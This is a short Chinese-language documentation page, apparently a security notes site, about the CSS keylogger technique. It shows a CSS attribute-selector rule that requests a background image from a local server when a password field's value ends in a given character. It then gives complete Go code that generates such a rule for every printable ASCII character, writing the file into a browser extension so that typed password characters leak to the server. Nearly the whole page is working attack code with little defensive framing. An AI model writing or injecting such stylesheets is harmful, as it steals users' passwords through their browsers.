# CSS 键盘记录器

[CSS Keylogger](https://github.com/maxchehab/CSS-Keylogging) 利用 CSS 属性选择器，可以在加载背景图像的前提下从外部服务器请求资源。

这种攻击非常简单。
例如，下面的 css 将选择类型等于 password 的所有输入的值和以。然后它会尝试加载一个来自 http://localhost:3000/a 的图片。

```css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

使用简单的脚本可以创建一个 css 文件，该文件将为每个 ASCII 字符发送自定义请求

```go
package main

import (
	"fmt"
	"log"
	"net/url"
	"os"
)

func main() {
	fmt.Println("Building keylogger.css")

	output, err := os.Create("./css-keylogger-extension/keylogger.css")
	if err != nil {
		log.Fatal("Cannot create output", err)
	}
	defer output.Close()
	for c := 32; c < 128; c++ {
		value := fmt.Sprintf("%c", c)
		urlValue := url.QueryEscape(value)

		if value == `"` {
			value = `\"`
		} else if value == `}` {
			value = `\\}`
		} else if value == `\` {
			value = `\\`
		}
		fmt.Fprintf(output, `input[type="password"][value$="%v"] { background-image: url("http://localhost:3000/%v"); }`, value, urlValue)
		fmt.Fprintf(output, "\n")
	}
	fmt.Println("Complete.")
}
```

<div style="float: right">更新时间: {docsify-updated}</div>
